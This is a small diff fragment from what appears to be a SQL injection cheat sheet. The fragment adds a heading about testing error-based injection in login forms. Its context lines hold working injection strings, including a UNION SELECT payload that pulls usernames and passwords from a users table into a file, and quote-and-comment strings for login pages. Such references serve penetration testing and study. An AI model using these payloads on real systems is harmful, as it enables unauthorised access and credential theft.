@@ -945,6 +945,9 @@ artists.php?artist=-1 union select 1,username,password from users into outfile "
                                                             Error based double quotes / login page / post parameter - ( only when error is visible on screen )
 
 
+Test error based in login forms or any post parameter
+
+
 ")    #
 
 ")  1=1 # 
